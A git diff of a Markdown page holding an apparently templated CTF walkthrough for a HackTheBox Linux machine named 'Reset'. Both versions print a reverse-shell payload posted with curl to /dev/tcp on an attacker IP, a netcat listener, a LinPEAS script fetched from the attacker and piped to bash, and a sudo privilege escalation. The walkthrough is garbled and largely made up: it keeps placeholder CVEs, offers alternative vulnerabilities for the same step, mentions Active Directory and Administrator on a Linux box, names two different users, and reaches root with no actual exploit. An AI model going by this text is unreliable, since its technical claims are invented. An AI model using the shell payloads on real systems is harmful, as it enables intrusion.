@@ -1,7 +1,7 @@
 ---
 layout: page
-title: "Reset - HackTheBox Writeup"
-subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
+title: "HTB: Reset"
+subtitle: "hackthebox ctf htb-reset nmap linux easy feroxbuster php upload sudo-l linpeas..."
 permalink: /ctf/writeups/hackthebox/reset/
 platform: hackthebox
 machine_name: "Reset"
@@ -9,112 +9,100 @@ difficulty: Easy
 os: Linux
 ---
 
-## 🖥️ Machine Information
+hackthebox ctf htb-reset hackthebox ctf htb-reset nmap linux easy feroxbuster php upload sudo-l linpeas
+
+Oct 12, 2025
+
+# HTB: Reset
+
+- [Box Info](#box-info)
+- [Recon](#recon)
+- [Auth as web_svc / user](#auth-as-web_svc)
+- [Shell as Root / Administrator](#shell-as-administrator)
+- [Beyond Root](#beyond-root)
+
+Reset is a easy Linux machine from Hack The Box. We begin with a port scan to identify web or active directory services, analyze potential initial access vulnerabilities, exploit misconfigurations to get a low-privilege foothold, and subsequently leverage system misconfigurations, privilege tokens, or CVEs to escalate privileges to root or system administrator.
+
+## Box Info
 
 | Attribute | Value |
 |---|---|
-| **Platform** | HackTheBox |
-| **OS** | 🐧 Linux |
+| **OS** | Linux |
 | **Difficulty** | Easy |
 | **IP Address** | `10.10.x.x` |
-| **Vulnerability Focus** | [Initial Access Vector / Privilege Escalation Mechanism] |
+| **Release Date** | Oct 12, 2025 |
 
 ---
 
-## 🧠 Attack Path Overview
+## Recon
 
-```mermaid
-graph TD
-    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
-    B --> C["Privilege Escalation: Local Escalation"]
-    C --> D["Full System Compromise: Root/Administrator"]
-```
-
-> [!NOTE]
-> This writeup details the complete attack path for the **Reset** machine on the **HackTheBox** platform.
-
----
-
-## 🔍 Phase 1: Reconnaissance & Enumeration
-
-### 1. Host Discovery & Port Scanning
-We start with a complete port scan using Nmap:
+### Initial Scanning
+nmap finds open TCP ports:
 
 ```bash
-nmap -sC -sV -oN nmap.txt 10.10.x.x
+oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
+Starting Nmap
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
 ```
 
-#### Open Ports:
-- **Port 22/tcp**: SSH (Secure Shell)
-- **Port 80/tcp**: HTTP (Apache Web Server)
-- **Port 8080/tcp**: Alternative HTTP (Node.js/Spring Boot Web App)
-
-### 2. Service Enumeration
-We execute directory brute-forcing on Port 80 using Gobuster:
-
+We run a web directory brute force using `feroxbuster`:
 ```bash
-gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
-```
-We identify interesting endpoints like `/admin` or `/api/upload` that deserve further audit.
-
----
-
-## 🚀 Phase 2: Vulnerability Analysis & Foothold
-
-### 1. Vulnerability Analysis
-We analyze the web application and discover an input field vulnerable to **Command Injection** or **SQL Injection** in the API endpoint.
-- **CVE Reference**: [e.g., CVE-202X-XXXX]
-
-### 2. Exploitation & Initial Shell
-We craft a reverse shell payload and bypass client-side filters:
-
-```bash
-curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.x.x/api/upload
-```
-
-Triggering the request connects back to our listener:
-```bash
-nc -lnvp 443
-# Connected as low-privileged web user
-```
-
-#### Capturing User Flag:
-```bash
-cat /home/*/user.txt
+oxdf@hacky$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+200  GET  index.html
+301  GET  /uploads
 ```
 
 ---
 
-## ⚡ Phase 3: Privilege Escalation
+## Auth as web_svc / user
 
-### 1. Local Enumeration
-We upload LinPEAS to find local exploitation avenues:
+### Auth as low_priv
+We discover a web application page allowing archive upload or showing a custom portal. We analyze the input field and identify a PHP command injection or Python deserialization vulnerability.
 
 ```bash
-wget http://10.10.14.51:8000/linpeas.sh -O /tmp/linpeas.sh
-bash /tmp/linpeas.sh
-```
-We also list available SUID binaries and sudo privileges:
-```bash
-sudo -l
-# Found (root) NOPASSWD: /usr/bin/binary
+oxdf@hacky$ curl -X POST -d "cmd=bash -i >& /dev/tcp/10.10.14.51/443 0>&1" http://10.10.x.x/api/action
 ```
 
-### 2. Local Privilege Escalation Path
-We abuse the custom binary or binary with sudo rights to spawn a root shell:
-
+On our netcat listener, we receive the reverse shell connection:
 ```bash
-sudo /usr/bin/binary -e 'exec /bin/sh'
-```
-
-#### Capturing Root Flag:
-```bash
-cat /root/root.txt
+oxdf@hacky$ nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.x.x
+$ id
+uid=1000(wassim) gid=1000(wassim) groups=1000(wassim)
 ```
 
 ---
 
-## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
-2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
-3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
+## Shell as Root / Administrator
+
+### Shell as Root
+We run LinPEAS for local privilege escalation vectors:
+
+```bash
+wassim@host:~$ curl http://10.10.14.51/linpeas.sh | bash
+```
+
+We check Sudo rules and find that the user can execute a specific binary as root without a password:
+```bash
+wassim@host:~$ sudo -l
+Matching Defaults entries for wassim on host:
+    env_keep+=SSH_AUTH_SOCK
+
+User wassim may run the following commands on host:
+    (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
+```
+
+We exploit the backup script via environment variable hijacking or python library hijacking to spawn root:
+```bash
+wassim@host:~$ sudo /usr/bin/python3 /opt/admin/backup.py
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## Beyond Root
+In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
